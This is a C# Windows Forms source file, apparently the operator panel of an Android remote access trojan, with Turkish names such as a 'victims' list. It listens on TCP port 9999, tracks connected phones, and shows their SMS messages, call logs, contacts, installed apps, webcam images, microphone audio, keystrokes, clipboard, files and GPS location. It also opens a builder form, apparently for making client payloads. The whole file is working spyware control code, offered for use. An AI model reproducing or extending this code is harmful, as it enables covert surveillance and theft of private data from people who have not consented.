using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using System.IO;
using System.Threading;                                 //MADE IN TURKEY//
using System.Drawing;

namespace SV
{
    public partial class Form1 : Form
    {
        List<Kurbanlar> kurban_listesi = new List<Kurbanlar>(); //Kurban (Client) listemiz.
        Socket soketimiz = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        private byte[] bafirimiz = new byte[short.MaxValue];
        public Form1()
        {
            InitializeComponent();
            new Port().ShowDialog();
            Dinle();
            
        }
        public static int port_no = 9999;
        public  void Dinle()
        {
            soketimiz = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            soketimiz.Bind(new IPEndPoint(IPAddress.Any, port_no));
            soketimiz.Listen(int.MaxValue);
            soketimiz.BeginAccept(new AsyncCallback(Client_Kabul), null);
        }

        void Client_Kabul(IAsyncResult ar)
        {
            try
            {
                Socket sock = soketimiz.EndAccept(ar);
                sock.BeginReceive(bafirimiz, 0, bafirimiz.Length, SocketFlags.None, new AsyncCallback(Client_Bilgi_Al), sock);
                soketimiz.BeginAccept(new AsyncCallback(Client_Kabul), null); //Tekrar client alımı için.
            }
            catch (Exception)
            {
            }
        }

         public delegate void _client_ekle(Socket socettt, string idddd , string machine_name,
            string ulke_dil, string uretici_model, string android_ver);
         public void ekleeee(Socket socettte, string idimiz, string makine_ismi,
             string ulke_dil, string uretici_model, string android_ver)
         {
            socettte.Send(Encoding.UTF8.GetBytes("UNIQ|" + socettte.Handle.ToString()), SocketFlags.None);
            kurban_listesi.Add(new Kurbanlar(socettte, idimiz)); //Kurban listemize yeni sınıf ekliyoruz. //Her sokete kimlik veriliyor gibi.
             ListViewItem lvi = new ListViewItem(idimiz);
            lvi.SubItems.Add(makine_ismi);
            lvi.SubItems.Add(socettte.RemoteEndPoint.ToString());
            lvi.SubItems.Add(ulke_dil);
            lvi.SubItems.Add(uretici_model);
            lvi.SubItems.Add(android_ver);
            lvi.ImageKey = ulke_dil.Split('/')[1] + ".png";
            listView1.Items.Add(lvi);
            new Bildiri(makine_ismi, uretici_model, 
           Image.FromFile(Environment.CurrentDirectory + "\\Klasörler\\Bayraklar\\" + ulke_dil.Split('/')[1] + ".png")).Show();
         }
        public static Bitmap ByteToImage(byte[] blob)
        {
            MemoryStream mStream = new MemoryStream();
            byte[] pData = blob;
            mStream.Write(pData, 0, Convert.ToInt32(pData.Length));
            Bitmap bm = new Bitmap(mStream, false);
            mStream.Dispose();
            return bm;
        }
        void Client_Bilgi_Al(IAsyncResult ar)
        {
            try
            {
                SocketError errorCode = default;
                Socket soket2 = (Socket)ar.AsyncState;
                int uzunluk = soket2.EndReceive(ar, out errorCode);
                string veri = Encoding.UTF8.GetString(bafirimiz, 0, uzunluk);
                string[] s = veri.Split('|');
                switch (s[0])
                {
                    case "IP":
                        Invoke(new _client_ekle(ekleeee), soket2, soket2.Handle.ToString(), s[1]
                          ,s[2], s[3], s[4]);                      
                        break;
                    case "CAMNOT":
                        Invoke((MethodInvoker)delegate { 
                        FİndKameraById(soket2.Handle.ToString()).label1.Visible = true;
                        });
                        break;
                    case "SMSLOGU":
                        FindSMSFormById(soket2.Handle.ToString()).listView1.Items.Clear();
                        if (s[1] != "SMS YOK")
                        {
                            string[] ana_Veriler = s[1].Split('&');
                            for (int k = 0; k < ana_Veriler.Length; k++)
                            {
                                try
                                {
                                    string[] bilgiler = ana_Veriler[k].Split('=');
                                    ListViewItem item = new ListViewItem(bilgiler[0]);
                                    item.SubItems.Add(bilgiler[1]);
                                    item.SubItems.Add(bilgiler[2]);
                                    item.SubItems.Add(bilgiler[3]);
                                    FindSMSFormById(soket2.Handle.ToString()).listView1.Items.Add(item);
                                }
                                catch (Exception) { }
                            }
                        }
                        else {
                            ListViewItem item = new ListViewItem("SMS Yok.");
                            FindSMSFormById(soket2.Handle.ToString()).listView1.Items.Add(item);                        
                        }
                        break;
                    case "CAGRIKAYITLARI":
                        try
                        {
                            FindCagriById(soket2.Handle.ToString()).listView1.Items.Clear();
                            if (s[1] != "CAGRI YOK")
                            {
                                string[] ana_Veriler = s[1].Split('&');
                                for (int k = 0; k < ana_Veriler.Length; k++)
                                {
                                    try
                                    {
                                        string[] bilgiler = ana_Veriler[k].Split('=');
                                        ListViewItem item = new ListViewItem(bilgiler[0]);
                                        item.SubItems.Add(bilgiler[1]);
                                        item.SubItems.Add(bilgiler[2]);
                                        item.SubItems.Add(bilgiler[3]);
                                        FindCagriById(soket2.Handle.ToString()).listView1.Items.Add(item);
                                    }
                                    catch (Exception) { }
                                }
                            }
                            else
                            {
                                ListViewItem item = new ListViewItem("Çağrı Yok.");
                                FindCagriById(soket2.Handle.ToString()).listView1.Items.Add(item);
                            }
                        }catch(Exception ex) { MessageBox.Show(ex.Message); }
                        break;
                    case "REHBER":
                        FindRehberById(soket2.Handle.ToString()).listView1.Items.Clear();
                        if (s[1] != "REHBER YOK")
                        {
                            string[] ana_Veriler = s[1].Split('&');
                            for (int k = 0; k < ana_Veriler.Length; k++)
                            {
                                try
                                {
                                    string[] bilgiler = ana_Veriler[k].Split('=');
                                    ListViewItem item = new ListViewItem(bilgiler[0]);
                                    item.SubItems.Add(bilgiler[1]);
                                    FindRehberById(soket2.Handle.ToString()).listView1.Items.Add(item);
                                }
                                catch (Exception) { }
                            }
                        }
                        else
                        {
                            ListViewItem item = new ListViewItem("Rehber Yok.");
                            FindRehberById(soket2.Handle.ToString()).listView1.Items.Add(item);
                        }
                        break;
                    case "APPS":
                        FindUygulamalarById(soket2.Handle.ToString()).listView1.Items.Clear();
                           string[] ana_Veriler_ = s[1].Split('&');
                            for (int k = 0; k < ana_Veriler_.Length; k++)
                            {
                                try
                                {
                                    string[] bilgiler = ana_Veriler_[k].Split('=');
                                    ListViewItem item = new ListViewItem(bilgiler[0]);
                                    item.SubItems.Add(bilgiler[1]);
                                FindUygulamalarById(soket2.Handle.ToString()).listView1.Items.Add(item);
                                }
                                catch (Exception) { }
                            }
                        break;
                    case "DOSYAALINDI":
                        MessageBox.Show(FindFileManagerById(soket2.Handle.ToString()), s[1],"Dosya Alındı", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        break;
                    case "WEBCAM":                       
                        var bt = new byte[int.Parse(s[1])];
                        Receive(soket2, bt, 0, bt.Length, 59999);
                        FİndKameraById(soket2.Handle.ToString()).pictureBox1.Image = ByteToImage(bt);
                        break;
                    case "FILES":
                        
                        Invoke((MethodInvoker)delegate {
                            
                            FindFileManagerById(soket2.Handle.ToString()).listView1.Items.Clear();
                            FindFileManagerById(soket2.Handle.ToString()).listView2.Items.Clear();
                            File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
                                + "\\files.txt", s[1]);
                            string[] lines = File.ReadAllLines(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
                                + "\\files.txt");
                            for (int i = 0; i < lines.Length; i++)
                            {
                                string[] parse = lines[i].Split('=');
                                try
                                {
                                    ListViewItem lv = new ListViewItem(parse[0]);
                                    lv.SubItems.Add(parse[1]);
                                    lv.SubItems.Add(parse[2]);
                                    lv.SubItems.Add(parse[3]);
                                    lv.SubItems.Add(parse[4]);
                                    if (parse[4] == "CİHAZ")
                                    {
                                        FindFileManagerById(soket2.Handle.ToString()).listView1.Items.Add(lv);
                                    }
                                    else 
                                    {
                                        if (parse[4] == "SDCARD")
                                        {
                                            FindFileManagerById(soket2.Handle.ToString()).listView2.Items.Add(lv);
                                        }
                                    }
                                }
                                catch (Exception) { }
                            }
                        
                        });
                        
                        break;
                    case "UZUNLUK":
                        var bt2 = new byte[int.Parse(s[1])];
                        Receive(soket2, bt2, 0, bt2.Length, 59999);
                        if(!Directory.Exists(Environment.CurrentDirectory + "\\Klasörler\\İndirilenler\\" + s[3]))
                        {
                            Directory.CreateDirectory(Environment.CurrentDirectory + "\\Klasörler\\İndirilenler\\" + s[3]);
                        }
                        try
                        {
                            File.WriteAllBytes(Environment.CurrentDirectory + "\\Klasörler\\İndirilenler\\" + s[3] + "\\"
                                + s[2], bt2);
                        }catch(Exception ex) { MessageBox.Show(ex.Message); }
                        try
                        {
                            MessageBox.Show(FindFileManagerById(soket2.Handle.ToString()), "Dosya indi", "İndirme Tamamlandı", MessageBoxButtons.OK,
                                MessageBoxIcon.Information);
                        }
                        catch (Exception) { }
                        break;
                    case "CHAR":
                        FindKeyloggerManagerById(soket2.Handle.ToString()).textBox1.Text += s[1].Replace("[NEW_LINE]", Environment.NewLine) 
                        + Environment.NewLine;
                        break;
                    case "LOGDOSYA":
                        if (s[1] == "LOG_YOK")
                        {
                            FindKeyloggerManagerById(soket2.Handle.ToString()).comboBox1.Items.Add("Log yok.");
                        }
                        else
                        {
                            string[] ayristir = s[1].Split('=');
                            for(int i =0;i<ayristir.Length; i++)
                            {
                                FindKeyloggerManagerById(soket2.Handle.ToString()).comboBox1.Items.Add(ayristir[i]);
                            }
                        }
                        break;
                    case "KEYGONDER":
                        FindKeyloggerManagerById(soket2.Handle.ToString()).textBox2.Text = s[1].Replace("[NEW_LINE]", Environment.NewLine);
                        break;
                    case "Wallpaper":
                        //
                        break;
                    case "SESBILGILERI":
                        string[] ayristir_ = s[1].Split('=');
                        try
                        {
                            FindAyarlarById(soket2.Handle.ToString()).trackBar1.Maximum = int.Parse(ayristir_[0].Split('/')[1]);
                            FindAyarlarById(soket2.Handle.ToString()).trackBar1.Value = int.Parse(ayristir_[0].Split('/')[0]);            
                            FindAyarlarById(soket2.Handle.ToString()).groupBox1.Text = "Zil Sesi " + ayristir_[0];
                            //
                            if(ayristir_[0].Split('/')[0] == "0") { FindAyarlarById(soket2.Handle.ToString()).groupBox3.Enabled = false; }
                            else { FindAyarlarById(soket2.Handle.ToString()).groupBox3.Enabled = true; }
                            //
                            FindAyarlarById(soket2.Handle.ToString()).trackBar2.Maximum = int.Parse(ayristir_[1].Split('/')[1]);
                            FindAyarlarById(soket2.Handle.ToString()).trackBar2.Value = int.Parse(ayristir_[1].Split('/')[0]);            
                            FindAyarlarById(soket2.Handle.ToString()).groupBox2.Text = "Medya " + ayristir_[1];
                            //
                            FindAyarlarById(soket2.Handle.ToString()).trackBar3.Maximum = int.Parse(ayristir_[2].Split('/')[1]);
                            FindAyarlarById(soket2.Handle.ToString()).trackBar3.Value = int.Parse(ayristir_[2].Split('/')[0]);                      
                            FindAyarlarById(soket2.Handle.ToString()).groupBox3.Text = "Bildirim " + ayristir_[2];
                        }
                        catch(Exception ex) { MessageBox.Show(ex.Message); }
                        break;
                    case "TELEFONBILGI":
                        //MessageBox.Show("telefon bilgi " + s[1]);
                        FindBilgiById(soket2.Handle.ToString()).progressBar1.Value = int.Parse(s[1].Replace("%",""));
                        FindBilgiById(soket2.Handle.ToString()).label1.Text = "Şarj seviyesi: %" + s[1];
                        break;
                    case "PANOGELDI":
                        FindTelephonFormById(soket2.Handle.ToString()).textBox4.Text = s[1];
                        break;
                    case "WALLPAPERBYTES":
                        try
                        {
                            byte[] kvp = new byte[int.Parse(s[1])];
                            Receive(soket2, kvp, 0, kvp.Length, 59999);
                            FindTelephonFormById(soket2.Handle.ToString()).pictureBox1.Image = imeyc(kvp);
                        }catch(Exception) { }
                        break;
                    case "LOCATION":
                        FindKonumById(soket2.Handle.ToString()).textBox1.Text = string.Empty;
                        string[] ayr = s[1].Split('=');
                        for (int i = 0; i < ayr.Length; i++)
                        {
                            FindKonumById(soket2.Handle.ToString()).textBox1.Text += ayr[i] + Environment.NewLine;
                        }
                        break;
                    case "PARLAKLIK":
                        try
                        {
                            //FindEglenceById(soket2.Handle.ToString()).trackBar1.Value = Convert.ToInt32(s[1]);
                            //FindEglenceById(soket2.Handle.ToString()).groupBox6.Text = "Parlaklık: " + s[1];
                        }
                        catch(Exception ex) { MessageBox.Show(ex.Message, s[1]); }
                        break;
                }
                soket2.BeginReceive(bafirimiz, 0, bafirimiz.Length, SocketFlags.None, new AsyncCallback(Client_Bilgi_Al), soket2); 
                //sürekli veri alabilmek için.
            }
            catch (Exception) {}
        }
        FİleManager fmanger;
        public Image imeyc(byte[] input)
        {
            using (var ms = new MemoryStream(input))
            {
                return Image.FromStream(ms);
            }
        }
        public static void Receive(Socket socket, byte[] buffer, int offset, int size, int timeout)
        {
            
            //int startTickCount = Environment.TickCount;
            int received = 0;
            do
            {
                //if (Environment.TickCount > startTickCount + timeout)
                  //  throw new Exception("Timeout.");
                try
                {
                    received += socket.Receive(buffer, offset + received, size - received, SocketFlags.None);
                    /*
                    try
                    {
                        yzd.label3.Text = received.ToString() + "/" + size.ToString();
                        yzd.label1.Text = ((100 / size) * received).ToString();
                        yzd.progressBar1.Value = ((100 / size) * received);
                        yzd.label2.Text = "İşlemdeki Dosya: ...";
                    }
                    catch (Exception) { }
                    */
                }
                catch (SocketException ex)
                {
                    if (ex.SocketErrorCode == SocketError.WouldBlock ||
                        ex.SocketErrorCode == SocketError.IOPending ||
                        ex.SocketErrorCode == SocketError.NoBufferSpaceAvailable)
                    {
                        Thread.Sleep(30);
                    }
                    else
                        throw ex; 
                }
            } while (received < size);
        }
        //Kamera msj = default;
        private void mesajYollaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Kurbanlar kurban in kurban_listesi)
            {
                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    Kamera msj = new Kamera(kurban.soket, kurban.id);
                    msj.Show();
                }
            }
        }
        // BENİM RAHAT ETMEDİĞİM DÜNYADA KİMSE İSTİRAHAT EDEMEZ.
        // https://www.youtube.com/watch?v=EOn9rRSdBNU
        private void timer1_Tick(object sender, EventArgs e) //Kontrolieren, welche client available ist.
        {
            foreach (Kurbanlar kurbanlar in kurban_listesi.ToList())
            {
                try
                {
                    kurbanlar.soket.Send(Encoding.UTF8.GetBytes("CLIENT_KONTROLIREN"));
                }
                catch (Exception)
                {
                    foreach (ListViewItem aytim in listView1.Items)
                    {
                        if (aytim.Text == kurbanlar.id)
                        {

                            listView1.Items.Remove(aytim);
                            kurban_listesi.Remove(kurbanlar);
                        }                  
                    }                                    
                }
            }
        }
        private void bağlantıyıKapatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Kurbanlar kurban in kurban_listesi)
            {
                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    fmanger = new FİleManager(kurban.soket,kurban.id);
                    fmanger.Show();
                    kurban.soket.Send(Encoding.UTF8.GetBytes("DOSYA|"));
                }
            }
        }    
        private void masaustuİzleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Kurbanlar kurban in kurban_listesi)
            {
                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    Telefon tlf = new Telefon(kurban.soket, kurban.id);
                    tlf.Show();
                }
            }
        }
        private void canlıMikrofonToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Kurbanlar kurban in kurban_listesi)
            {
                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    Mikrofon masaustu = new Mikrofon(kurban.soket);
                    masaustu.Show();
                }
            }
        }
        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Kurbanlar kurban in kurban_listesi)
            {
                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    Keylogger keylog = new Keylogger(kurban.soket, kurban.id);
                    keylog.Show();
                    kurban.soket.Send(Encoding.UTF8.GetBytes("LOGLARIHAZIRLA|"));                   
                }
            }
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }
        public Telefon FindTelephonFormById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Telefon>()
          .Where(form => string.Equals(form.uniq_id, ident))
           .ToList();
            return list.First();
        }
        public Rehber FindRehberById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Rehber>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public SMSYoneticisi FindSMSFormById(string ident)
        {
            var list = Application.OpenForms
          .OfType<SMSYoneticisi>()
          .Where(form => string.Equals(form.uniq_id, ident))
           .ToList();
            return list.First();
        }
        public FİleManager FindFileManagerById(string ident)
        {
            var list = Application.OpenForms
          .OfType<FİleManager>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public Keylogger FindKeyloggerManagerById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Keylogger>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public Kamera FİndKameraById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Kamera>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public CagriKayitlari FindCagriById(string ident)
        {
            var list = Application.OpenForms
          .OfType<CagriKayitlari>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public Ayarlar FindAyarlarById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Ayarlar>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public Uygulamalar FindUygulamalarById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Uygulamalar>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public Bigliler FindBilgiById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Bigliler>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public Konum FindKonumById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Konum>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public Eglence FindEglenceById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Eglence>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        private void sMSYöneticisiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Kurbanlar kurban in kurban_listesi)
            {
                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    SMSYoneticisi sMS = new SMSYoneticisi(kurban.soket, kurban.id);
                    sMS.Show();
                    byte[] gidecek = Encoding.UTF8.GetBytes("GELENKUTUSU|");
                    Gonderici.Send(kurban.soket, gidecek, 0, gidecek.Length, 59999);
                }
            }           
        }
        private void çağrıKayıtlarıToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Kurbanlar kurban in kurban_listesi)
            {
                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    CagriKayitlari sMS = new CagriKayitlari(kurban.soket, kurban.id);
                    sMS.Show();
                    byte[] gidecek = Encoding.UTF8.GetBytes("CALLLOGS|");
                    Gonderici.Send(kurban.soket, gidecek, 0, gidecek.Length, 59999);
                }
            }
        }

        private void telefonAyarlarıToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Kurbanlar kurban in kurban_listesi)
            {
                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    Ayarlar sMS = new Ayarlar(kurban.soket, kurban.id);
                    sMS.Show();
                    byte[] bilgiler = Encoding.UTF8.GetBytes("VOLUMELEVELS|");
                    Gonderici.Send(kurban.soket, bilgiler, 0, bilgiler.Length, 59999);
                }
            }
        }

        private void rehberToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Kurbanlar kurban in kurban_listesi)
            {
                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    Rehber sMS = new Rehber(kurban.soket, kurban.id);
                    sMS.Show();
                    byte[] bayt = Encoding.UTF8.GetBytes("REHBERIVER|");
                    Gonderici.Send(kurban.soket, bayt, 0, bayt.Length, 59999);
                }
            }         
        }

        private void eğlencePaneliToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Kurbanlar kurban in kurban_listesi)
            {
                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    Eglence eglence = new Eglence(kurban.soket, kurban.id);
                    eglence.Show();
                    //byte[] bayt = Encoding.UTF8.GetBytes("PARLAKLIK|");
                    //Gonderici.Send(kurban.soket, bayt, 0, bayt.Length, 59999);
                }
            }
        }
        private void uygulamaListesiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Kurbanlar kurban in kurban_listesi)
            {
                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    Uygulamalar eglence = new Uygulamalar(kurban.soket, kurban.id);
                    eglence.Show();
                    byte[] gonder = Encoding.UTF8.GetBytes("APPLICATIONS|");
                    Gonderici.Send(kurban.soket, gonder, 0, gonder.Length, 59999);
                }
            }
        }

        private void telefonDurumuToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Kurbanlar kurban in kurban_listesi)
            {
                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    Bigliler eglence = new Bigliler(kurban.soket, kurban.id);
                    eglence.Show();
                    byte[] gonder = Encoding.UTF8.GetBytes("SARJ|");
                    Gonderici.Send(kurban.soket, gonder, 0, gonder.Length, 59999);
                }
            }
        }
        private void oluşturToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Builder().Show();
        }
    
        private void hakkındaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Hakkinda().Show();
        }

        private void konumToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Kurbanlar kurban in kurban_listesi)
            {
                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    Konum knm = new Konum(kurban.soket, kurban.id);
                    knm.Show();
                    byte[] gonder = Encoding.UTF8.GetBytes("KONUM|");
                    Gonderici.Send(kurban.soket, gonder, 0, gonder.Length, 59999);
                }
            }
        }
    }
}